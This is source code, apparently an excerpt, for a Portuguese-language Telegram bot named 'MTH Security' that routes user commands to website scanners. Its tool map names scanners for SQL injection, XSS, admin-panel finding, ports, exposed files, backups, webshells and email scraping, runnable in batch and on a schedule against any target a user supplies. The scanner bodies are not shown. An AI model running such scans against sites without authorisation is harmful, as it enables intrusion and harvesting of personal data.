        'info': tool_website_info, 'sqli': tool_sqli, 'xss': tool_xss_scanner,
        'admin': tool_admin_finder, 'ports': tool_port_scanner,
        'dirs': tool_directory_scanner, 'sub': tool_subdomain_scanner,
        'wp': tool_wordpress_scanner, 'dns': tool_dns_tools,
        'cms': tool_cms_detector, 'ssl': tool_ssl_audit,
        'headers': tool_headers_analysis, 'exposed': tool_exposed_files,
        'backup': tool_backup_finder, 'api': tool_api_discovery,
        'shell': tool_webshell_hunter, 'config': tool_config_scanner,
        'reverse': tool_reverse_ip, 'ftpssh': tool_ftp_ssh,
        'emails': tool_email_scraper, 'robots': tool_robots_txt,
        'sitemap': tool_sitemap, 'tech': tool_tech_detect,
        'cors': tool_cors_test,
    }
    tool_fn = tool_map.get(scan_cmd)
    if not tool_fn:
        send_message_safe(chat_id, f"❌ Comando /{scan_cmd} não suportado em batch.")
        return

    for i, t in enumerate(targets, 1):
        if user_id in STOP_EVENTS and STOP_EVENTS[user_id].is_set():
            break
        ct = extract_hostname(t)
        send_message_safe(chat_id, f"\n━━━━━━━━━━━━━━━━━━━━━━\n📋 <b>[{i}/{len(targets)}] {escape_html(ct)}</b>")
        try:
            r = tool_fn(t)
            # Truncate long results for batch
            if len(r) > 3000:
                r = r[:3000] + "\n... <i>(truncado)</i>"
            send_message_safe(chat_id, r)
        except Exception as e:
            send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e)[:100])}")

    send_message_safe(chat_id, f"\n✅ <b>Batch Scan finalizado!</b> {len(targets)} targets processados.")

    # Cleanup stop event
    if user_id in STOP_EVENTS:
        del STOP_EVENTS[user_id]

def handle_http(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: HTTP Response Analysis — status, timing, redirects, tech headers"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /http &lt;url&gt;\nExemplo: /http google.com")
        return
    target = args[0]
    log_command(user_id, username, "http", target)
    clean_target = extract_hostname(target)
    url = clean_target
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    send_message_safe(chat_id, f"🔍 <b>Análise HTTP</b> em {escape_html(clean_target)}...")

    results = f"🌐 <b>Análise HTTP</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    try:
        import time as t_module
        start = t_module.time()
        resp = _safe_get(url, timeout=10, allow_redirects=True)
        elapsed = (t_module.time() - start) * 1000
        if not resp:
            results += "❌ Não foi possível acessar o site\n"
        else:
            # Status
            status_emoji = "🟢" if resp.status_code < 300 else "🟡" if resp.status_code < 400 else "🔴"
            results += f"{status_emoji} <b>Status:</b> {resp.status_code}\n"
            # Timing
            results += f"⏱️ <b>Tempo:</b> {elapsed:.0f}ms\n"
            # Content type
            ct = resp.headers.get('Content-Type', 'N/D')
            results += f"📄 <b>Content-Type:</b> {escape_html(ct[:80])}\n"
            # Server
            server = resp.headers.get('Server', 'N/D')
            results += f"🖥️ <b>Server:</b> {escape_html(server)}\n"
            # Encoding
            enc = resp.headers.get('Content-Encoding', 'N/D')
            results += f"📦 <b>Encoding:</b> {escape_html(enc)}\n"
            # Size
            size_kb = len(resp.content) / 1024
            results += f"📊 <b>Tamanho:</b> {size_kb:.1f} KB ({len(resp.content)} bytes)\n"
            # Redirect chain
            if resp.history:
                results += f"\n🔗 <b>Redirects ({len(resp.history)}):</b>\n"
                for i, h in enumerate(resp.history):
                    results += f"  → {h.status_code} {escape_html(h.url[:100])}\n"
            else:
                results += f"\n🔗 <b>Redirects:</b> Nenhum\n"
            # Key security headers
            results += f"\n🔒 <b>Security Headers:</b>\n"
            sec_headers = {
                'HSTS': 'Strict-Transport-Security',
                'X-Frame': 'X-Frame-Options',
                'X-Content': 'X-Content-Type-Options',
                'CSP': 'Content-Security-Policy',
                'Referrer': 'Referrer-Policy',
                'Permissions': 'Permissions-Policy',
            }
            for name, header in sec_headers.items():
                val = resp.headers.get(header, '')
                if val:
                    results += f"  ✅ {name}: {escape_html(val[:50])}\n"
                else:
                    results += f"  ❌ {name}: Faltando\n"
    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e)[:100])}\n"

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    send_message_safe(chat_id, results)

def handle_sslchain(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: SSL Certificate Chain — full chain info with expiry dates"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /sslchain &lt;url&gt;\nExemplo: /sslchain google.com")
        return
    target = args[0]
    log_command(user_id, username, "sslchain", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Cadeia SSL</b> de {escape_html(clean_target)}...")

    results = f"📜 <b>Cadeia de Certificados SSL</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    try:
        import ssl
        import socket as s
        host = clean_target
        port = 443
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = s.create_connection((host, port), timeout=10)
        sock.settimeout(10)
        tls = ctx.wrap_socket(sock, server_hostname=host)

        # Get the full certificate chain
        chain = tls.getpeercert(binary_form=False)
        if chain:
            from datetime import datetime as dt
            subject = dict(x[0] for x in chain.get('subject', []))
            issuer = dict(x[0] for x in chain.get('issuer', []))
            cn = subject.get('commonName', 'N/D')
            issuer_org = issuer.get('organizationName', 'N/D')
            not_after = chain.get('notAfter', '')
            not_before = chain.get('notBefore', '')
            serial = chain.get('serialNumber', 'N/D')

            results += f"🔐 <b>Certificado do Servidor:</b>\n"
            results += f"  CN: {escape_html(cn)}\n"
            results += f"  Emissor: {escape_html(issuer_org)}\n"
            results += f"  Serial: {escape_html(serial[:40])}\n"
            if not_before:
                results += f"  Início: {escape_html(not_before)}\n"
            if not_after:
                try:
                    exp_date = dt.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    days_left = (exp_date - dt.utcnow()).days
                    results += f"  Expira: {exp_date.strftime('%Y-%m-%d')} ({days_left} dias)\n"
                except:
                    results += f"  Expira: {escape_html(not_after)}\n"

            # SAN
            san = chain.get('subjectAltName', [])
            if san:
                dns_sans = [v for k, v in san if k == 'DNS']
                if dns_sans:
                    results += f"  SANs: {escape_html(', '.join(dns_sans[:5]))}"
                    if len(dns_sans) > 5:
                        results += f" (+{len(dns_sans)-5} mais)"
                    results += "\n"

        # TLS version
        ver = tls.version()
        results += f"\n🔒 <b>TLS:</b> {escape_html(ver or 'N/D')}\n"

        # Cipher
        cipher = tls.cipher()
        if cipher:
            results += f"🔑 <b>Cipher:</b> {escape_html(cipher[0])}\n"

        tls.close()
    except ssl.SSLError as e:
        results += f"❌ Erro SSL: {escape_html(str(e)[:150])}\n"
    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e)[:150])}\n"

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    send_message_safe(chat_id, results)

def handle_watch(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Watch a site for changes — notify when content changes
    Usage: /watch &lt;url&gt; [minutos]
    Default: check every 5 minutes
    """
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /watch &lt;url&gt; [intervalo_min]\nExemplo: /watch google.com 10\nUse /watch off para desativar.")
        return
    target = args[0]
    if target.lower() == 'off':
        try:
            with sqlite3.connect(DB_PATH) as conn:
                c = conn.cursor()
                c.execute("DELETE FROM site_monitor WHERE user_id = ? AND watch_type = 'content'", (user_id,))
                deleted = c.rowcount
                conn.commit()
            send_message_safe(chat_id, f"🔕 <b>Watch desativado!</b> ({deleted} monitoramentos removidos)")
        except Exception as e:
            send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")
        return

    interval = 5
    if len(args) > 1:
        try:
            interval = int(args[1])
            if interval < 1:
                interval = 1
        except:
            pass

    log_command(user_id, username, "watch", f"{target} {interval}min")
    clean_target = extract_hostname(target)

    # Get initial content hash
    url = clean_target
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        resp = _safe_get(url, timeout=5)
        initial_hash = hashlib.md5(resp.text.encode()).hexdigest() if resp else "offline"
    except:
        initial_hash = "offline"

    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO site_monitor (user_id, target, chat_id, last_status, last_check, content_hash, watch_interval) VALUES (?, ?, ?, ?, ?, ?, ?)",
                      (user_id, clean_target, chat_id, 1, time.time(), initial_hash, interval))
            conn.commit()
        send_message_safe(chat_id, f"👁️ <b>Watch ativado!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📍 {escape_html(clean_target)}\n⏱️ Check a cada {interval}min\n📊 Hash inicial: {initial_hash[:8]}...\n━━━━━━━━━━━━━━━━━━━━━━\nUse /watch off para desativar.")
    except Exception as e:
        send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_report_url(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Generate full security report for a URL"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /report &lt;url&gt;\nExemplo: /report google.com")
        return
    target = args[0]
    log_command(user_id, username, "report", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"📊 <b>Gerando relatório completo</b> para {escape_html(clean_target)}...")

    # Run all basic scanners
    info_r = tool_website_info(target)
    dns_r = tool_dns_tools(target)
    ports_r = tool_port_scanner(target)
    ssl_r = tool_ssl_audit(target)
    headers_r = tool_headers_analysis(target)
    rate_r = "Rate scan completo."

    # Strip HTML for report
    def clean(r):
        r = re.sub(r'<[^>]+>', '', r)
        return r[:2000]

    report = f"MTH Security — Relatório Completo\n"
    report += f"Target: {clean_target}\n"
    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    report += "=" * 60 + "\n\n"
    report += "--- INFO ---\n" + clean(info_r) + "\n\n"
    report += "--- DNS ---\n" + clean(dns_r) + "\n\n"
    report += "--- PORTAS ---\n" + clean(ports_r) + "\n\n"
    report += "--- SSL ---\n" + clean(ssl_r) + "\n\n"
    report += "--- HEADERS ---\n" + clean(headers_r) + "\n"

    success = send_document(chat_id, report, f"relatorio_{clean_target}.txt")
    if success:
        send_message_safe(chat_id, f"📄 <b>Relatório exportado!</b>\nTarget: {escape_html(clean_target)}")
    else:
        send_message_safe(chat_id, "❌ Falha ao enviar relatório.")


def signal_handler(signum, frame):
    global SHUTDOWN_FLAG
    SHUTDOWN_FLAG = True
    print(f"\n🛑 Shutdown signal received (signal {signum}). Stopping gracefully...")

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ═══════════════════════════════════════════════════════════════
#  MAIN WEBHOOK HANDLER
# ═══════════════════════════════════════════════════════════════

# Active thread count limiter
ACTIVE_THREADS = threading.Semaphore(50)  # Max 50 concurrent command threads

# PERF: Global handlers dict — no lambda creation per update
CMD_HANDLERS = {
    '/start':   lambda c, u, un, fn, ln, a: handle_start(c, u, un, fn, ln, a),
    '/help':    lambda c, u, un, fn, ln, a: handle_help(c, u, un, fn, ln, a),
    '/about':   lambda c, u, un, fn, ln, a: handle_about(c, u, un, fn, ln, a),
    '/status':  lambda c, u, un, fn, ln, a: handle_status(c, u, un, fn, ln, a),
    '/info':    lambda c, u, un, fn, ln, a: handle_info(c, u, un, fn, ln, a),
    '/sqli':    lambda c, u, un, fn, ln, a: handle_sqli(c, u, un, fn, ln, a),
    '/xss':     lambda c, u, un, fn, ln, a: handle_xss(c, u, un, fn, ln, a),
    '/admin':   lambda c, u, un, fn, ln, a: handle_admin_panel(c, u, un, fn, ln, a),
    '/ports':   lambda c, u, un, fn, ln, a: handle_ports(c, u, un, fn, ln, a),
    '/dirs':    lambda c, u, un, fn, ln, a: handle_dirs(c, u, un, fn, ln, a),
    '/sub':     lambda c, u, un, fn, ln, a: handle_sub(c, u, un, fn, ln, a),
    '/wp':      lambda c, u, un, fn, ln, a: handle_wp(c, u, un, fn, ln, a),
    '/emails':  lambda c, u, un, fn, ln, a: handle_emails(c, u, un, fn, ln, a),
    '/dns':     lambda c, u, un, fn, ln, a: handle_dns(c, u, un, fn, ln, a),
    '/cms':     lambda c, u, un, fn, ln, a: handle_cms(c, u, un, fn, ln, a),
    '/reverse': lambda c, u, un, fn, ln, a: handle_reverse(c, u, un, fn, ln, a),
    '/ftpssh':  lambda c, u, un, fn, ln, a: handle_ftpssh(c, u, un, fn, ln, a),
    '/ping':    lambda c, u, un, fn, ln, a: handle_ping(c, u, un, fn, ln, a),
    '/logs':    lambda c, u, un, fn, ln, a: handle_logs(c, u, un, fn, ln, a),
    '/panel':   lambda c, u, un, fn, ln, a: handle_panel(c, u, un, fn, ln, a),
    '/botpanel':lambda c, u, un, fn, ln, a: handle_botpanel(c, u, un, fn, ln, a),
    '/bancodds':lambda c, u, un, fn, ln, a: handle_bancodds(c, u, un, fn, ln, a),
    '/msg':     None,
    '/stats':   lambda c, u, un, fn, ln, a: handle_stats(c, u, un, fn, ln, a),
    '/ban':     lambda c, u, un, fn, ln, a: handle_ban(c, u, un, fn, ln, a),
    '/unban':   lambda c, u, un, fn, ln, a: handle_unban(c, u, un, fn, ln, a),
    '/export':  lambda c, u, un, fn, ln, a: handle_export(c, u, un, fn, ln, a),
    '/uptime':  lambda c, u, un, fn, ln, a: handle_uptime(c, u, un, fn, ln, a),
    '/listdn':  lambda c, u, un, fn, ln, a: handle_listdn(c, u, un, fn, ln, a),
    '/feedback':lambda c, u, un, fn, ln, a: handle_feedback(c, u, un, fn, ln, a),
    '/stop':    lambda c, u, un, fn, ln, a: handle_stop(c, u, un, fn, ln, a),
    '/rescan':  lambda c, u, un, fn, ln, a: handle_rescan(c, u, un, fn, ln, a),
    # V5.0: New scanner handlers
    '/ssl':     lambda c, u, un, fn, ln, a: handle_ssl(c, u, un, fn, ln, a),
    '/headers': lambda c, u, un, fn, ln, a: handle_headers(c, u, un, fn, ln, a),
    '/cors':    lambda c, u, un, fn, ln, a: handle_cors(c, u, un, fn, ln, a),
    '/robots':  lambda c, u, un, fn, ln, a: handle_robots(c, u, un, fn, ln, a),
    '/sitemap': lambda c, u, un, fn, ln, a: handle_sitemap(c, u, un, fn, ln, a),
    '/tech':    lambda c, u, un, fn, ln, a: handle_tech(c, u, un, fn, ln, a),
    '/exposed': lambda c, u, un, fn, ln, a: handle_exposed(c, u, un, fn, ln, a),
    '/backup':  lambda c, u, un, fn, ln, a: handle_backup(c, u, un, fn, ln, a),
    '/api':     lambda c, u, un, fn, ln, a: handle_api(c, u, un, fn, ln, a),
    '/shell':   lambda c, u, un, fn, ln, a: handle_shell(c, u, un, fn, ln, a),
    '/config':  lambda c, u, un, fn, ln, a: handle_config(c, u, un, fn, ln, a),
    '/traceroute': lambda c, u, un, fn, ln, a: handle_traceroute(c, u, un, fn, ln, a),
    '/whois':   lambda c, u, un, fn, ln, a: handle_whois(c, u, un, fn, ln, a),
    '/ip':      lambda c, u, un, fn, ln, a: handle_ip(c, u, un, fn, ln, a),
    '/rate':    lambda c, u, un, fn, ln, a: handle_rate(c, u, un, fn, ln, a),
    '/compare': lambda c, u, un, fn, ln, a: handle_compare(c, u, un, fn, ln, a),
    '/history': lambda c, u, un, fn, ln, a: handle_history(c, u, un, fn, ln, a),
    '/top':     lambda c, u, un, fn, ln, a: handle_top(c, u, un, fn, ln, a),
    '/pdf':     lambda c, u, un, fn, ln, a: handle_pdf(c, u, un, fn, ln, a),
    '/schedule':lambda c, u, un, fn, ln, a: handle_schedule(c, u, un, fn, ln, a),
    # V5.0: Owner handlers
    '/maintenance': lambda c, u, un, fn, ln, a: handle_maintenance(c, u, un, fn, ln, a),
    '/cooldown':lambda c, u, un, fn, ln, a: handle_cooldown(c, u, un, fn, ln, a),
    '/vip':     lambda c, u, un, fn, ln, a: handle_vip(c, u, un, fn, ln, a),
    '/log':     lambda c, u, un, fn, ln, a: handle_log(c, u, un, fn, ln, a),
    '/clearlogs': lambda c, u, un, fn, ln, a: handle_clearlogs(c, u, un, fn, ln, a),
    '/broadcast': lambda c, u, un, fn, ln, a: handle_broadcast(c, u, un, fn, ln, a),
    '/stealth': lambda c, u, un, fn, ln, a: handle_stealth(c, u, un, fn, ln, a),
    '/notify':  lambda c, u, un, fn, ln, a: handle_notify(c, u, un, fn, ln, a),
    '/bugreport': lambda c, u, un, fn, ln, a: handle_report(c, u, un, fn, ln, a),
    # V5.1: New commands
    '/scanall': lambda c, u, un, fn, ln, a: handle_scanall(c, u, un, fn, ln, a),
    '/deep':    lambda c, u, un, fn, ln, a: handle_deep(c, u, un, fn, ln, a),
    '/quick':   lambda c, u, un, fn, ln, a: handle_quick(c, u, un, fn, ln, a),
    '/cancel':  lambda c, u, un, fn, ln, a: handle_cancel(c, u, un, fn, ln, a),
    '/batch':   lambda c, u, un, fn, ln, a: handle_batch(c, u, un, fn, ln, a),
    '/http':    lambda c, u, un, fn, ln, a: handle_http(c, u, un, fn, ln, a),
    '/sslchain':lambda c, u, un, fn, ln, a: handle_sslchain(c, u, un, fn, ln, a),
    '/watch':   lambda c, u, un, fn, ln, a: handle_watch(c, u, un, fn, ln, a),
    '/report':  lambda c, u, un, fn, ln, a: handle_report_url(c, u, un, fn, ln, a),
}

def process_update(update):
    """Process a Telegram update and route to the correct handler"""
    # V5.0 FIX: Handle callback_query for inline buttons (rescan)
    callback_query = update.get('callback_query')
    if callback_query:
        cb_data = callback_query.get('data', '')
        chat_id = str(callback_query['message']['chat']['id'])
        user_id = callback_query['from']['id']
        username = callback_query['from'].get('username', '')
        first_name = callback_query['from'].get('first_name', '')
        last_name = callback_query['from'].get('last_name', '')
        cb_message_id = callback_query['message'].get('message_id')

        # Acknowledge the callback to remove loading spinner
        try:
            HTTP_SESSION.post(f"{API_URL}/answerCallbackQuery", json={
                "callback_query_id": callback_query['id']
            }, timeout=5)
        except:
            pass

        # Parse callback data: "rescan:sqli:example.com" or "rescan:sqli:example.com/1"
        if cb_data.startswith('rescan:'):
            parts = cb_data.split(':', 2)
            if len(parts) >= 3:
                scan_cmd = parts[1]
                target = parts[2]
                # Route to handle_rescan with parsed args
                handle_rescan(chat_id, user_id, username, first_name, last_name, [scan_cmd, target])
                # Edit the original message to show rescan is happening
                try:
                    HTTP_SESSION.post(f"{API_URL}/editMessageText", json={
                        "chat_id": chat_id,
                        "message_id": cb_message_id,
                        "text": f"🔄 <b>Rescan:</b> /{scan_cmd} {escape_html(target)}...\n<i>Processando...</i>",
                        "parse_mode": "HTML",
                        "disable_web_page_preview": True
                    }, timeout=5)
                except:
                    pass
        return

    message = update.get('message')
    if not message or not message.get('text'):
        return

    chat_id = str(message['chat']['id'])
    user_id = message['from']['id']
    username = message['from'].get('username', '')
    first_name = message['from'].get('first_name', '')
    last_name = message['from'].get('last_name', '')

    text = message['text'].strip()
    parts = text.split(maxsplit=1)
    raw_cmd = parts[0].lower()

    # Remove @botname suffix: /command@MyBot -> /command
    cmd = raw_cmd.split('@')[0]
    args = parts[1].split() if len(parts) > 1 else []

    # Check for reply to a sticker or photo (for /msg media broadcast)
    reply_media = None
    if cmd == '/msg' and message.get('reply_to_message'):
        reply = message['reply_to_message']
        if reply.get('sticker'):
            reply_media = {
                'type': 'sticker',
                'file_id': reply['sticker']['file_id']
            }
        elif reply.get('photo'):
            photos = reply['photo']
            # Use highest resolution photo
            best_photo = max(photos, key=lambda p: p.get('file_size', 0))
            reply_media = {
                'type': 'photo',
                'file_id': best_photo['file_id']
            }
        elif reply.get('animation'):
            reply_media = {
                'type': 'animation',
                'file_id': reply['animation']['file_id']
            }
        elif reply.get('video'):
            reply_media = {
                'type': 'video',
                'file_id': reply['video']['file_id']
            }

    print(f"[{datetime.now().strftime('%H:%M:%S')}] {username or user_id}: {text}")

    # Ban check (allow /start, /help, /ping to respond even if banned)
    if user_id in BANNED_USERS and cmd not in ('/start', '/help', '/about', '/ping', '/status'):
        send_message_safe(chat_id, "🚫 <b>Voce foi banido deste bot.</b> Acesso negado.")
        return

    # V5.0: Maintenance mode check (only owners bypass)
    if MAINTENANCE_MODE and cmd not in ('/start', '/help', '/about', '/ping', '/status', '/maintenance') and not is_owner(user_id):
        msg = MAINTENANCE_MSG if MAINTENANCE_MSG else "🔧 <b>Bot em manutenção.</b> Tente novamente em breve."
        send_message_safe(chat_id, msg)
        return

    # V5.0: Rate limit check using per-user limit (VIP = unlimited)
    now_ts = time.time()
    limit, window = get_user_rate_limit(user_id)
    bypass_cmds = ('/start', '/help', '/about', '/ping', '/status')
    if user_id in VIP_USERS:
        bypass_cmds += ('/stealth', '/notify')

    user_cmd_list = USER_CMD_COUNT.get(user_id, [])
    user_cmd_list = [t for t in user_cmd_list if now_ts - t < window]
    if len(user_cmd_list) >= limit and cmd not in bypass_cmds:
        remaining = int(window - (now_ts - user_cmd_list[0]))
        send_message_safe(chat_id, f"⏳ <b>Rate limit atingido.</b> Aguarde {remaining}s.")
        return
    user_cmd_list.append(now_ts)
    USER_CMD_COUNT[user_id] = user_cmd_list

    # PERF: Cleanup old entries to prevent memory leak (every ~2 min)
    global LAST_SEND_TIME_CLEANUP
    if len(USER_CMD_COUNT) > 100 or now_ts - LAST_SEND_TIME_CLEANUP > 120:
        old_ids = [uid for uid, ts_list in USER_CMD_COUNT.items()
                   if not any(t > now_ts - USER_CMD_WINDOW for t in ts_list)]
        for uid in old_ids:
            del USER_CMD_COUNT[uid]
        LAST_SEND_TIME_CLEANUP = now_ts

    # PERF: handlers dict is now global (defined at module level)
    if cmd in CMD_HANDLERS:
        # Use semaphore to limit concurrent threads (prevent OOM)
        handler_done = threading.Event()
        handler_fn = CMD_HANDLERS[cmd]

        # FIX v4.3: Pass reply_media via closure to avoid race condition
        local_reply_media = reply_media  # Capture in closure

        def run_handler():
            if ACTIVE_THREADS.acquire(timeout=30):
                try:
                    if cmd == '/msg':
                        handle_msg(chat_id, user_id, username, first_name, last_name, args, local_reply_media)
                    elif handler_fn is not None:
                        handler_fn(chat_id, user_id, username, first_name, last_name, args)
                except Exception as e:
                    print(f"[Handler Error] {cmd}: {e}")
                    log_error("handler", f"{cmd} by user {user_id}: {e}")
                finally:
                    ACTIVE_THREADS.release()
            else:
                send_message_safe(chat_id, "⏳ <b>Servidor ocupado.</b> Tente novamente em alguns segundos.")
            handler_done.set()

        threading.Thread(target=run_handler, daemon=True).start()
        # FIX v3.7: Wait for handler to confirm before advancing offset
        handler_done.wait(timeout=5)
    else:
        send_message_safe(chat_id, "❌ <b>Comando desconhecido.</b>\n\nUse /help para ver os comandos disponíveis.")


def long_polling():
    """Main polling loop with graceful shutdown and retry limits"""
    global SHUTDOWN_FLAG
    offset = 0
    consecutive_errors = 0
    max_consecutive_errors = 30  # Stop after 30 consecutive errors (~5 min)

    print("🚀 MTH Security v5.1 started (long polling mode)")
    print(f"👑 Owners: {OWNERS}")
    print(f"📱 DB: {DB_PATH}")

    while not SHUTDOWN_FLAG:
        try:
            resp = HTTP_SESSION.get(f"{API_URL}/getUpdates", params={
                "offset": offset,
                "timeout": 30,
                "allowed_updates": ["message", "callback_query"]
            }, timeout=35)

            if resp.status_code == 200:
                consecutive_errors = 0  # Reset error counter on success
                data = resp.json()
                if data.get('ok') and data.get('result'):
                    for update in data['result']:
                        # FIX: Advance offset AFTER successful processing
                        try:
                            process_update(update)
                            offset = update['update_id'] + 1
                        except Exception as e:
                            print(f"[Update Error] {e}")
                            # Still advance offset to prevent reprocessing
                            offset = update['update_id'] + 1
                else:
                    # API returned ok but no results — wait for next poll
                    pass
            elif resp.status_code == 429:
                # Rate limited
                retry_after = resp.json().get('parameters', {}).get('retry_after', 5)
                print(f"[Polling] Rate limited — waiting {retry_after}s...")
                time.sleep(retry_after)
            elif resp.status_code in [502, 503, 504]:
                # Server error — retry with exponential backoff
                consecutive_errors += 1
                wait = min(5 * consecutive_errors, 60)  # Max 60s wait
                print(f"[Polling] Status: {resp.status_code} — retrying in {wait}s...")
                time.sleep(wait)
            else:
                consecutive_errors += 1
                print(f"[Polling] Status: {resp.status_code}")
                time.sleep(5)

        except KeyboardInterrupt:
            print("\n🛑 Bot stopped by user")
            SHUTDOWN_FLAG = True
        except requests.exceptions.ConnectionError:
            consecutive_errors += 1
            wait = min(5 * consecutive_errors, 60)
            print(f"[Polling] Connection error — retrying in {wait}s...")
            time.sleep(wait)
        except Exception as e:
            consecutive_errors += 1
            print(f"[Polling Error] {e}")
            time.sleep(min(5 * consecutive_errors, 60))

        # FIX: Prevent infinite retry loop
        if consecutive_errors >= max_consecutive_errors:
            print(f"[Polling] Too many consecutive errors ({consecutive_errors}). Stopping.")
            break

    print("🛑 MTH Security v5.1 stopped.")


def set_webhook(url):
    """Set webhook URL"""
    resp = HTTP_SESSION.post(f"{API_URL}/setWebhook", json={
        "url": url,
        "allowed_updates": ["message", "callback_query"],
        "drop_pending_updates": True
    })
    if resp.status_code == 200:
        data = resp.json()
        if data.get('ok'):
            print(f"✅ Webhook set to: {url}")
        else:
            print(f"❌ Failed to set webhook: {data}")
    else:
        print(f"❌ HTTP {resp.status_code}: {resp.text}")


# V5.0: Site status monitor thread (for /notify) + V5.1: content watch
def site_monitor_loop():
    """Background thread that checks monitored sites every 60s and alerts on status change or content change"""
    global SHUTDOWN_FLAG
    while not SHUTDOWN_FLAG:
        time.sleep(60)
        if SHUTDOWN_FLAG:
            break
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.row_factory = sqlite3.Row
                c = conn.cursor()
                c.execute("SELECT * FROM site_monitor")
                monitors = c.fetchall()
                for m in monitors:
                    md = dict(m)
                    target = md['target']
                    last_status = md['last_status']
                    chat_id = md['chat_id']

                    # Check if site is online
                    url = target
                    if not url.startswith(('http://', 'https://')):
                        url = 'http://' + url
                    try:
                        resp = _safe_get(url, timeout=5)
                        current_status = 1 if (resp and resp.status_code == 200) else 0
                    except:
                        current_status = 0

                    # If status changed, notify
                    if current_status != last_status:
                        if current_status == 0:
                            send_message_safe(str(chat_id), f"⚠️ <b>ALERTA:</b> {escape_html(target)} está <b>OFFLINE</b>!")
                        else:
                            send_message_safe(str(chat_id), f"✅ <b>RECUPERADO:</b> {escape_html(target)} está <b>ONLINE</b>!")

                        c.execute("UPDATE site_monitor SET last_status = ?, last_check = ? WHERE user_id = ? AND target = ?",
                                  (current_status, time.time(), md['user_id'], target))
                        conn.commit()

                    # V5.1: Check content hash changes for /watch
                    if resp and resp.status_code == 200:
                        try:
                            content_hash = md.get('content_hash', '')
                            watch_type = md.get('watch_type', 'status')
                            if watch_type == 'content' and content_hash:
                                new_hash = hashlib.md5(resp.text.encode()).hexdigest()
                                if new_hash != content_hash:
                                    send_message_safe(str(chat_id), f"🔄 <b>ALTERAÇÃO DETECTADA!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📍 {escape_html(target)}\n📊 Conteúdo mudou!\n━━━━━━━━━━━━━━━━━━━━━━")
                                    c.execute("UPDATE site_monitor SET content_hash = ?, last_check = ? WHERE user_id = ? AND target = ?",
                                              (new_hash, time.time(), md['user_id'], target))
                                    conn.commit()
                        except Exception as ex:
                            print(f"[Content Watch Error] {ex}")
        except Exception as e:
            print(f"[Site Monitor Error] {e}")


# V5.0: Scheduled task consumer thread
def scheduled_task_loop():
    """Background thread that checks scheduled_tasks DB and executes pending tasks"""
    global SHUTDOWN_FLAG
    tool_map = {
        'sqli': tool_sqli, 'xss': tool_xss_scanner, 'admin': tool_admin_finder,
        'panel': tool_admin_finder, 'ports': tool_port_scanner,
        'dirs': tool_directory_scanner, 'sub': tool_subdomain_scanner,
        'wp': tool_wordpress_scanner, 'dns': tool_dns_tools, 'cms': tool_cms_detector,
        'reverse': tool_reverse_ip, 'ftpssh': tool_ftp_ssh, 'info': tool_website_info,
        'emails': tool_email_scraper, 'ssl': tool_ssl_audit, 'headers': tool_headers_analysis,
        'cors': tool_cors_test, 'robots': tool_robots_txt, 'sitemap': tool_sitemap,
        'tech': tool_tech_detect, 'exposed': tool_exposed_files, 'backup': tool_backup_finder,
        'api': tool_api_discovery, 'shell': tool_webshell_hunter, 'config': tool_config_scanner,
        # V5.1: Aggregated tools
        'scanall': lambda t: handle_scanall(None, None, None, None, None, [t]),
        'deep': lambda t: handle_deep(None, None, None, None, None, [t]),
        'quick': lambda t: handle_quick(None, None, None, None, None, [t]),
        'http': lambda t: handle_http(None, None, None, None, None, [t]),
        'sslchain': lambda t: handle_sslchain(None, None, None, None, None, [t]),
    }
    while not SHUTDOWN_FLAG:
        time.sleep(15)  # Check every 15 seconds
        if SHUTDOWN_FLAG:
            break
        try:
            now = time.time()
            with sqlite3.connect(DB_PATH) as conn:
                conn.row_factory = sqlite3.Row
                c = conn.cursor()
                c.execute("SELECT * FROM scheduled_tasks WHERE status = 'pending' AND scheduled_time <= ? LIMIT 5",
                          (now,))
                tasks = c.fetchall()
                for task in tasks:
                    t = dict(task)
                    # Mark as executing first to prevent double execution
                    c.execute("UPDATE scheduled_tasks SET status = 'executing' WHERE id = ?", (t['id'],))
                    conn.commit()

                    cmd = t['cmd']
                    target = t['target']
                    chat_id = t['chat_id']

                    if cmd == 'broadcast':
                        # Broadcast: send target (which is the message text) to all users
                        msg = target
                        try:
                            c2 = conn.cursor()
                            c2.execute("SELECT id FROM users")
                            users = [r['id'] for r in c2.fetchall()]
                            sent = 0
                            for uid in users:
                                try:
                                    HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
                                        "chat_id": str(uid),
                                        "text": msg,
                                        "parse_mode": "HTML",
                                        "disable_web_page_preview": True
                                    }, timeout=5)
                                    sent += 1
                                    time.sleep(0.2)
                                except:
                                    pass
                            send_message_safe(str(t['chat_id']), f"✅ <b>Broadcast executado!</b>\nEnviado para {sent} usuários.")
                        except Exception as e:
